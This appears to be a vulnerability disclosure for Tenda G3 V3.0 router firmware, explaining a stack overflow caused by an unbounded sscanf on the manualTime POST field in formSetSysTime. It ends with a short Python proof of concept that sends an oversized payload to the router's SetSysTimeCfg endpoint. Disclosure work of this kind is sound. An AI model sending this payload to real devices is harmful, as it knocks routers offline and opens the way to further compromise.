## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3369.html

## Affected version

G3V3.0 V15.11.0.20

## Vulnerability details

The Tenda G3V3.0 V15.11.0.20 firmware has a stack overflow vulnerability in the `formSetSysTime` function. The `mode` variable receives the `sysTimePolicy` parameter from a POST request and we let `mode=="manual"` to execute  code in `else if`. 

![image-20240417093027306](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417093027306.png)

The `manual_time` variable receives the `manualTime` parameter from a POST request. However, since the user can control the input of `manualTime`, the statement `sscanf((const char *)manual_time, "%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s", year, month, day, hour, min, sec);` can cause a buffer overflow. The user-provided  `time` can exceed the capacity of the `year, month, day, hour, min, sec` array, triggering this security vulnerability.

![image-20240417092952972](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417092952972.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSysTimeCfg"
payload = b"a"*2000

data = {
        'sysTimePolicy':'manual',
        'manualTime':payload,
    }
response = requests.post(url, data=data)
print(response.text)![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
```
